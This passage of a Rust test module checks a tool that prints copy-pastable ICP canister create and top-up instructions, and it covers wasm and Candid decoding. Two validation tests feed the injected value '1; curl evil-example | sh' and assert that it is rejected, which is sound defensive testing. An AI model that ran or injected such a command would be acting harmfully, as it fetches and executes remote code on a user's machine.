        let shell = create_canister_instructions(CreateCanisterArgs {
            cycles: None,
            icp: Some("1; curl evil-example | sh".into()),
        })
        .expect_err("shell-looking icp must be rejected");
        assert!(shell.contains("invalid ICP amount"), "{shell}");
        let out = create_canister_instructions(CreateCanisterArgs {
            cycles: None,
            icp: Some(" 0.5 ".into()),
        })
        .unwrap();
        assert!(out.instructions.contains("icp cycles mint --icp 0.5 -n ic"), "{}", out.instructions);
        assert!(
            out.instructions.contains("--cycles <CYCLES>"),
            "{}",
            out.instructions
        );
    }

    // icp_top_up_canister is instructions-only: the structured output must say
    // nothing was executed, and the printed commands must be copy-pastable —
    // canonical canister id, given amounts substituted, the rest left as
    // placeholders.
    #[test]
    fn top_up_instructions_execute_nothing_and_echo_cycles() {
        let out = top_up_instructions(TopUpArgs {
            canister_id: "  ryjl3-tyaaa-aaaaa-aaaba-cai ".into(),
            cycles: Some(600_000_000_000),
            icp: None,
        })
        .unwrap();
        assert!(!out.executed, "the tool must never execute a top-up");
        assert_eq!(out.canister_id, "ryjl3-tyaaa-aaaaa-aaaba-cai", "id must be canonicalized");
        assert!(out.instructions.contains("No top-up was performed"), "{}", out.instructions);
        assert!(
            out.instructions.contains(
                "icp canister top-up ryjl3-tyaaa-aaaaa-aaaba-cai --amount 600000000000 -e ic"
            ),
            "{}",
            out.instructions
        );
        // Where to get the CLI is part of the instructions: an npm one-liner
        // inline, plus the releases page for the other installers.
        assert!(
            out.instructions.contains("npm install -g @icp-sdk/icp-cli"),
            "{}",
            out.instructions
        );
        assert!(
            out.instructions.contains("https://github.com/dfinity/icp-cli/releases"),
            "{}",
            out.instructions
        );
        // No ICP amount given: the conversion lines keep a fill-in placeholder.
        assert!(out.instructions.contains("--icp <ICP_AMOUNT>"), "{}", out.instructions);
        assert!(out.instructions.contains("cycles-management"), "{}", out.instructions);
    }

    #[test]
    fn top_up_instructions_echo_icp_and_leave_cycles_placeholder() {
        let out = top_up_instructions(TopUpArgs {
            canister_id: "aaaaa-aa".into(),
            cycles: None,
            icp: Some(" 0.5 ".into()),
        })
        .unwrap();
        assert!(!out.executed);
        assert!(out.instructions.contains("icp cycles mint --icp 0.5 -n ic"), "{}", out.instructions);
        assert!(
            out.instructions.contains("icp canister top-up aaaaa-aa --amount <CYCLES> -e ic"),
            "{}",
            out.instructions
        );
    }

    // The echoed amounts are advertised as copy-pastable, so junk is rejected
    // (never printed): a non-numeric `icp` — including a string smuggling shell
    // input — and a zero `cycles` are errors, exactly as on the old executing
    // path.
    #[test]
    fn top_up_instructions_validate_amounts() {
        let shell = top_up_instructions(TopUpArgs {
            canister_id: "aaaaa-aa".into(),
            cycles: None,
            icp: Some("1; curl evil-example | sh".into()),
        })
        .expect_err("shell-looking icp must be rejected");
        assert!(shell.contains("invalid ICP amount"), "{shell}");
        assert!(top_up_instructions(TopUpArgs {
            canister_id: "aaaaa-aa".into(),
            cycles: None,
            icp: Some("abc".into()),
        })
        .is_err());
        let zero = top_up_instructions(TopUpArgs {
            canister_id: "aaaaa-aa".into(),
            cycles: Some(0),
            icp: None,
        })
        .expect_err("zero cycles must be rejected");
        assert!(zero.contains("greater than 0"), "{zero}");
    }

    #[test]
    fn top_up_instructions_reject_bad_canister_id() {
        let err = top_up_instructions(TopUpArgs {
            canister_id: "not-a-principal!".into(),
            cycles: None,
            icp: None,
        })
        .expect_err("an invalid canister id must be rejected");
        assert!(err.contains("invalid principal"), "{err}");
    }

    #[test]
    fn parses_install_modes() {
        assert!(matches!(parse_mode("install").unwrap(), CanisterInstallMode::Install));
        assert!(matches!(parse_mode("REINSTALL").unwrap(), CanisterInstallMode::Reinstall));
        assert!(matches!(parse_mode("upgrade").unwrap(), CanisterInstallMode::Upgrade(None)));
        assert!(parse_mode("frobnicate").is_err());
    }

    #[test]
    fn wasm_base64_and_hex_decode_identically() {
        let wasm = b"\x00asm\x01\x00\x00\x00".to_vec();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&wasm);
        let hx = hex::encode(&wasm);
        let from_b64 = decode_wasm(&InstallCodeArgs {
            canister_id: "aaaaa-aa".into(),
            wasm_base64: Some(b64),
            wasm_hex: None,
            mode: "install".into(),
            arg: "()".into(),
        })
        .unwrap();
        let from_hex = decode_wasm(&InstallCodeArgs {
            canister_id: "aaaaa-aa".into(),
            wasm_base64: None,
            wasm_hex: Some(hx),
            mode: "install".into(),
            arg: "()".into(),
        })
        .unwrap();
        assert_eq!(from_b64, wasm);
        assert_eq!(from_hex, wasm);
    }

    #[test]
    fn missing_wasm_is_an_error() {
        let err = decode_wasm(&InstallCodeArgs {
            canister_id: "aaaaa-aa".into(),
            wasm_base64: None,
            wasm_hex: Some("  ".into()),
            mode: "install".into(),
            arg: "()".into(),
        });
        assert!(err.is_err());
    }

    // Round-trip the args we encode/decode so a wrong field name/order or a bad
    // variant rename fails loudly at test time, not on mainnet.
    #[test]
    fn install_code_arg_round_trips() {
        let arg = InstallCodeArg {
            mode: CanisterInstallMode::Upgrade(Some(UpgradeOpts::default())),
            canister_id: Principal::management_canister(),
            wasm_module: vec![0, 1, 2, 3],
            arg: vec![],
            sender_canister_version: None,
        };
        let bytes = Encode!(&arg).expect("encode");
        // Decoding back into the real types proves the wire shape is consistent
        // and that the variant rename ("upgrade") round-trips.
        #[derive(CandidType, Deserialize)]
        struct Mirror {
            mode: CanisterInstallMode,
            canister_id: Principal,
            wasm_module: Vec<u8>,
            arg: Vec<u8>,
        }
        let m = Decode!(&bytes, Mirror).expect("decode");
        assert!(matches!(m.mode, CanisterInstallMode::Upgrade(_)));
        assert_eq!(m.canister_id, Principal::management_canister());
        assert_eq!(m.wasm_module, vec![0, 1, 2, 3]);
    }

    // canister_status reply: encode a record carrying EXTRA fields we don't model
    // and confirm our subset struct still decodes (forward-compatibility).
    #[test]
    fn canister_status_tolerates_extra_fields() {
        let textual = "(record { \
            status = variant { running }; \
            settings = record { \
                controllers = vec { principal \"aaaaa-aa\" }; \
                compute_allocation = 0 : nat; \
                memory_allocation = 0 : nat; \
                freezing_threshold = 2_592_000 : nat; \
                reserved_cycles_limit = 5_000_000_000_000 : nat; \
                wasm_memory_limit = 3_221_225_472 : nat; \
                log_visibility = variant { controllers } \
            }; \
            module_hash = opt blob \"\\de\\ad\"; \
            memory_size = 1234 : nat; \
            cycles = 9_000_000_000_000 : nat; \
            idle_cycles_burned_per_day = 100 : nat; \
            reserved_cycles = 0 : nat; \
            query_stats = record { num_calls_total = 7 : nat } \
        })";
        let bytes = candid_parser::parse_idl_args(textual)
            .unwrap()
            .to_bytes()
            .unwrap();
        let decoded = Decode!(&bytes, CanisterStatusResult).expect("subset decode");
        assert!(matches!(decoded.status, CanisterRunStatus::Running));
        assert_eq!(decoded.cycles, Nat::from(9_000_000_000_000u128));
        let rendered = format_status(Principal::management_canister(), &bytes);
        assert!(rendered.contains("status: running"), "{rendered}");
        assert!(rendered.contains("module hash: dead"), "{rendered}");
    }
}
